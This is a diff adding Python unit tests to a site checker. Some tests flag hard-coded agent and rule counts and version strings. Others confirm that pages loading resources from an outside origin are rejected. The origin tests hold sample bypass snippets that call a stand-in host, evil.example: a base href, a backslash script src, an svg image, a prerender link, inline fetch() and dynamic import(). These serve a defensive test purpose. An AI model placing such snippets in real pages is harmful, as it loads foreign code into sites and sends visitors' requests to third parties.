@@ -40,6 +40,30 @@ class HandNumbersTests(unittest.TestCase):
             with self.subTest(text=text):
                 self.assertTrue(self.run_on({"content/a.md": text}), text)
 
+    def test_review_bypasses_are_caught(self):
+        for text in (
+            "**15** agents",
+            "에이전트 **15개**",
+            "<strong>15</strong> agents",
+            "15&nbsp;agents",
+            "12개 거버넌스 룰",
+            "거버넌스 룰 **12개**",
+            "15 review agents",
+            "15 subagents",
+            "agents: 15",
+        ):
+            with self.subTest(text=text):
+                self.assertTrue(self.run_on({"content/a.md": text}), text)
+
+    def test_versions_in_short_forms_and_config_are_caught(self):
+        self.assertTrue(self.run_on({"layouts/a.html": "v5.2"}))
+        self.assertTrue(self.run_on({"layouts/a.html": "5.2.x"}))
+        self.assertTrue(self.run_on({"hugo.toml": 'description = "ships 15 agents"'}))
+        self.assertTrue(self.run_on({"assets/css/main.css": '.x::after { content: "15 skills"; }'}))
+
+    def test_version_tail_is_not_a_count(self):
+        self.assertEqual(self.run_on({"content/blog/p.md": "v2.18.0부터 각 규칙, removed in v2.17.0 the git-workflow agent"}), [])
+
     def test_shortcodes_and_unrelated_numbers_pass(self):
         ok = 'The release ships {{< kit "agents" >}} agents. P0 to P3. Six reviewers, 3 rounds, python3 3.9.'
         self.assertEqual(
@@ -90,6 +114,22 @@ class OriginTests(unittest.TestCase):
         for name, html in cases.items():
             with self.subTest(name=name):
                 self.assertTrue(self.run_on({"index.html": html}), name)
+
+    def test_review_origin_bypasses_fail(self):
+        cases = {
+            "base": '<base href="https://evil.example/">',
+            "backslash": '<script src="/\\evil.example/x.js"></script>',
+            "http same host": '<script src="http://hiway.thishw.com/x.js"></script>',
+            "svg image": '<svg><image href="https://evil.example/p.png"/></svg>',
+            "prerender": '<link rel="prerender" href="https://evil.example/">',
+            "inline fetch": '<script>fetch("https://evil.example/p")</script>',
+        }
+        for name, html in cases.items():
+            with self.subTest(name=name):
+                self.assertTrue(self.run_on({"index.html": html}), name)
+
+    def test_script_file_calling_out_fails(self):
+        self.assertTrue(self.run_on({"index.html": "", "js/t.js": 'import("https://evil.example/m.js")'}))
 
     def test_css_font_from_cdn_fails(self):
         self.assertTrue(
